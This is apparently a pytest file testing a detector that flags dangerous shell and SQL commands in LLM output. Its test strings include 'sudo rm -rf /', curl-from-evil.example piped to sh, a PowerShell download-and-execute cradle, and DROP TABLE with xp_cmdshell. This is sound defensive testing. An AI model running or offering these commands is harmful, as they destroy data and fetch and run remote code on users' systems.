import pytest
from llm_output_guard.detectors.tools import detect_tools
from llm_output_guard.types import FindingType, Severity


def _has_type(findings, ftype):
    return any(f.type == ftype for f in findings)


def _count_type(findings, ftype):
    return sum(1 for f in findings if f.type == ftype)


def test_detects_rm_rf_root():
    txt = "You can clean up with: sudo rm -rf / # be careful"
    f = detect_tools(txt)
    assert _has_type(f, FindingType.TOOL_SHELL)


def test_detects_pipe_to_sh():
    txt = "curl -s https://evil.example/install.sh | sh"
    f = detect_tools(txt)
    assert _has_type(f, FindingType.TOOL_SHELL)
    # strongest signal should be present for this pattern
    assert any(
        x.type == FindingType.TOOL_SHELL and x.severity == Severity.CRITICAL for x in f
    )


def test_detects_subshell_and_chain():
    txt = "token=$(curl -sS http://x); echo $token && rm -rf /tmp/test"
    f = detect_tools(txt)
    # both subshell and chain map to the shell bucket; expect at least two shell findings
    assert _count_type(f, FindingType.TOOL_SHELL) >= 2


def test_detects_system_calls():
    txt = "import os; os.system('rm -rf /tmp/foo')"
    f = detect_tools(txt)
    assert _has_type(f, FindingType.TOOL_SHELL)


def test_detects_sql_drop_and_xp_cmdshell():
    txt = "DROP TABLE users; EXEC xp_cmdshell 'dir C:\\\\';"
    f = detect_tools(txt)
    # both patterns map to the sql_drop bucket
    assert _count_type(f, FindingType.TOOL_SQL_DROP) >= 2


def test_detects_powershell_invoke():
    txt = "IEX (New-Object Net.WebClient).DownloadString('http://x/y.ps1')"
    f = detect_tools(txt)
    # we bucket PowerShell invoke into tools.shell for now
    assert _has_type(f, FindingType.TOOL_SHELL)


def test_inline_backticks_low_signal():
    txt = "Run `echo hello` for a quick test."
    f = detect_tools(txt)
    assert _has_type(f, FindingType.TOOL_SHELL)


def test_code_fence_bash():
    txt = """```bash
curl -fsSL https://get.docker.com | sh
```"""
    f = detect_tools(txt)
    # code fence + pipe-to-sh both fall under shell bucket
    assert _count_type(f, FindingType.TOOL_SHELL) >= 2
    # and at least one should be critical (the pipe-to-sh)
    assert any(
        x.type == FindingType.TOOL_SHELL and x.severity == Severity.CRITICAL for x in f
    )
